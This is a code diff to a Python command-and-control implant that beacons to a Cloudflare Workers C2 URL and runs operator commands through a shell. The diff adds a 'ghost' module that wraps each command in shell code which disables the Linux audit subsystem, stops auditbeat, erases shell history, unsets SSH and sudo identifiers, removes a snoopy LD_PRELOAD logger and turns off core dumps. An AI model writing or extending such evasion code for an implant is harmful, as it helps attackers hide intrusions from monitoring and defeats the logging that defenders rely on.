@@ -108,6 +108,7 @@ import time, urllib.error, urllib.request, zlib
 C2_PSK      = os.environ.get("C2_PSK",        "changeme")
 BEACON_INT  = int(os.environ.get("C2_INT",    "60"))
 JITTER      = int(os.environ.get("C2_JITTER", "30"))
+GHOST_MODE  = False
 WORKER_URL       = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
 RELAY_PORT       = int(os.environ.get("C2_RELAY_PORT",     "0"))
 RELAY_BIND       = os.environ.get("C2_RELAY_BIND",         "0.0.0.0")
@@ -400,6 +401,42 @@ def _module_relay(args):
     return f"[unknown relay subcommand: {args[0]}]"
 
 
+_GHOST_WRAP = (
+    "_GS_AUDIT=0 _GS_ABEAT=0\n"
+    "if command -v auditctl >/dev/null 2>&1 && [ \"$(id -u)\" = \"0\" ]; then\n"
+    "    auditctl -e 0 2>/dev/null && _GS_AUDIT=1\n"
+    "fi\n"
+    "if [ \"$_GS_AUDIT\" = \"1\" ] && command -v systemctl >/dev/null 2>&1"
+    " && systemctl is-active --quiet auditbeat 2>/dev/null; then\n"
+    "    systemctl stop auditbeat 2>/dev/null && _GS_ABEAT=1\n"
+    "fi\n"
+    "unset HISTFILE HISTFILESIZE HISTSIZE HISTCONTROL HISTIGNORE PROMPT_COMMAND\n"
+    "export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0 HISTIGNORE='*'\n"
+    "unset SSH_CLIENT SSH_CONNECTION SSH_TTY SSH_AUTH_SOCK SSH_AGENT_PID\n"
+    "unset SUDO_USER SUDO_UID SUDO_GID SUDO_COMMAND\n"
+    "unset TERM_PROGRAM TERM_PROGRAM_VERSION ITERM_SESSION_ID"
+    " KONSOLE_VERSION GNOME_TERMINAL_SCREEN VTE_VERSION\n"
+    "echo \"${LD_PRELOAD:-}\" | grep -qi snoopy && unset LD_PRELOAD\n"
+    "ulimit -c 0 2>/dev/null\n"
+)
+_GHOST_POST = (
+    "\n_GS_EXIT=$?\n"
+    "[ \"$_GS_AUDIT\" = \"1\" ] && auditctl -e 1 2>/dev/null\n"
+    "[ \"$_GS_ABEAT\" = \"1\" ] && systemctl start auditbeat 2>/dev/null\n"
+    "exit $_GS_EXIT\n"
+)
+
+
+def _module_ghost(args) -> str:
+    global GHOST_MODE
+    if not args or args[0] not in ("on", "off", "status"):
+        return "[usage: /module ghost on|off|status]"
+    if args[0] == "status":
+        return f"[ghost: {'on' if GHOST_MODE else 'off'}]"
+    GHOST_MODE = args[0] == "on"
+    return f"[ghost: {args[0]}]"
+
+
 def _module_heartbeat(args) -> str:
     global BEACON_INT, JITTER
     if args and args[0] == "status":
@@ -429,6 +466,8 @@ def _exec(cmd):
             return _module_relay(parts[1:])
         if parts[0] == "heartbeat":
             return _module_heartbeat(parts[1:])
+        if parts[0] == "ghost":
+            return _module_ghost(parts[1:])
         return f"[unknown module: {parts[0]}]"
     if cmd.startswith("UPLOAD:"):
         try:
@@ -448,7 +487,8 @@ def _exec(cmd):
         except Exception as e:
             return f"[error: {e}]"
     try:
-        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
+        shell_cmd = f"{_GHOST_WRAP}{cmd}{_GHOST_POST}" if GHOST_MODE else cmd
+        r = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=600)
         out = (r.stdout + r.stderr) or "[no output]"
         if len(out) > MAX_OUTPUT:
             out = out[:MAX_OUTPUT] + "[...truncated]"
